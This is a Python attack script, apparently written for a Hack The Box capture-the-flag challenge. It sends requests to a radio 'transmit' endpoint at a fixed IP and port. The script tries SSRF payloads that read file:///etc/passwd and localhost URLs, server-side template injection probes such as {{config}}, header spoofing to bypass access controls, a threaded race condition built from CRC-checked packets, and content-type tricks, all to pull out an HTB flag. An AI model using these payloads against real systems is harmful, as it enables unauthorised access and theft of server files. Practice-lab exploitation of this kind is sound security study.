#!/usr/bin/env python3
import requests
import struct
import time
import re

def crc16(data, poly=0x1D0F):
    crc = 0x0000
    for byte in data:
        crc ^= (byte << 8)
        for _ in range(8):
            if crc & 0x8000:
                crc = ((crc << 1) ^ poly) & 0xFFFF
            else:
                crc = (crc << 1) & 0xFFFF
    return crc

base_url = 'http://94.237.53.81:59575'

# INNOVACIÓN 46: SSRF - Server Side Request Forgery
print("[*] INNOVACIÓN 46: SSRF attempts")
s = requests.Session()
s.get(base_url)

ssrf_payloads = [
    'file:///flag.txt',
    'file:///etc/passwd',
    'http://localhost/flag',
    'http://127.0.0.1:59575/flag',
]

for payload in ssrf_payloads:
    r = s.post(f'{base_url}/transmit', data={
        'freq': payload,
        'mod': 'ASK',
        'bits': '1',
        'msg': 'test'
    })
    if 'HTB{' in r.text or 'root:' in r.text:
        print(f"[SUCCESS with {payload}]", r.text[:200])
        break

# INNOVACIÓN 47: Template injection
print("\n[*] INNOVACIÓN 47: Template injection")
ssti_payloads = [
    '{{7*7}}',
    '${7*7}',
    '<%= 7*7 %>',
    '{{config}}',
    '{{self}}',
]

for payload in ssti_payloads:
    r = s.post(f'{base_url}/transmit', data={
        'freq': payload,
        'mod': payload,
        'bits': '1',
        'msg': payload
    })
    if '49' in r.text or 'HTB{' in r.text:
        print(f"[+] Possible SSTI with {payload}")
        print(r.text[:200])

# INNOVACIÓN 48: Enviar headers especiales
print("\n[*] INNOVACIÓN 48: Headers especiales")
headers_list = [
    {'X-Forwarded-For': '127.0.0.1'},
    {'X-Real-IP': '127.0.0.1'},
    {'X-Original-URL': '/flag'},
    {'X-Rewrite-URL': '/flag'},
    {'Referer': 'http://localhost/admin'},
]

for headers in headers_list:
    s2 = requests.Session()
    s2.headers.update(headers)
    r = s2.get(base_url)
    if 'HTB{' in r.text:
        print(f"[SUCCESS with headers {headers}]", re.findall(r'HTB\{[^}]+\}', r.text))
        break

# INNOVACIÓN 49: Race condition - enviar múltiples requests simultáneamente
print("\n[*] INNOVACIÓN 49: Race condition")
import threading

def send_packet(addr, cmd):
    s3 = requests.Session()
    data = bytes([addr, cmd])
    crc = crc16(data)
    packet = (data + struct.pack('<H', crc)).hex().upper()
    s3.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': 'ASK', 'bits': '1', 'msg': packet})

threads = []
for addr, cmd in [(0xE1, 0xFF), (0xE2, 0xFF), (0xE3, 0xFF), (0xA1, 0xF1), (0xA2, 0xF1), (0xA3, 0xF1), (0xA4, 0xF1)]:
    t = threading.Thread(target=send_packet, args=(addr, cmd))
    threads.append(t)
    t.start()

for t in threads:
    t.join()

time.sleep(2)
r = s.get(base_url)
if 'HTB{' in r.text:
    print("[SUCCESS with race condition]", re.findall(r'HTB\{[^}]+\}', r.text))

# INNOVACIÓN 50: Enviar con Content-Type diferente
print("\n[*] INNOVACIÓN 50: Different Content-Types")
content_types = [
    'application/x-www-form-urlencoded',
    'multipart/form-data',
    'text/plain',
    'application/xml',
]

for ct in content_types:
    s4 = requests.Session()
    s4.headers['Content-Type'] = ct
    r = s4.post(f'{base_url}/transmit', data={
        'freq': '433.92',
        'mod': 'ASK',
        'bits': '1',
        'msg': 'A1F184FBE1FF217D'
    })
    if 'HTB{' in r.text:
        print(f"[SUCCESS with CT {ct}]", re.findall(r'HTB\{[^}]+\}', r.text))
        break

print("\n[*] Innovaciones 46-50 completadas")
